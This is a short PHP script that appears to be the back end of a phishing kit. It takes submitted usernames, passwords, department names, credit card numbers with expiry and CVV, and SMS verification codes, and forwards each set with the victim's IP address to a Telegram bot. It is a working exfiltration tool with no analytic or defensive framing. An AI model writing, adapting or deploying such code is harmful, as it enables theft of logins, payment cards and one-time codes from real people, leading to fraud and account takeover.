<?php
require "../main.php";

$ip = $_SERVER['REMOTE_ADDR'];
if($_SERVER['REMOTE_ADDR']=="::1"){
$ip = "127.0.0.1";
}else{
$ip = $_SERVER['REMOTE_ADDR'];
}


function post($data){
if(empty(trim($data))){
return "NO_DATA";
}else{
return htmlspecialchars($_POST[$data]);
}
}


function sendBot($url){
file_get_contents($url);
}


// function sendBot($url){
// 	$ci = curl_init();
// 	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
// 	curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
// 	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
// 	curl_setopt($ci, CURLOPT_URL, $url);
// 	curl_close($ci);
// 	return curl_exec($ci);

// }





if(isset($_POST['user'])){



$telegram_content = urlencode("
CA LOG -/ $ip
User : ".$_POST['user']."
Pass : ".$_POST['pass']."
Department : ".$_POST['depart']."
");
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}



if(isset($_POST['cc'])){



$telegram_content = urlencode("
CA CC -/ $ip
CC : ".$_POST['cc']."
Exp : ".$_POST['exp']."
Cvv : ".$_POST['cvv']."
");

//SENDING INFO TO TELEGRAM BOT...
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);


}






if(isset($_POST['sms'])){

$sms = post("sms");

$telegram_content = urlencode("
/- CA SMS -/ $ip
CODE : $sms
");


$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);


}







?>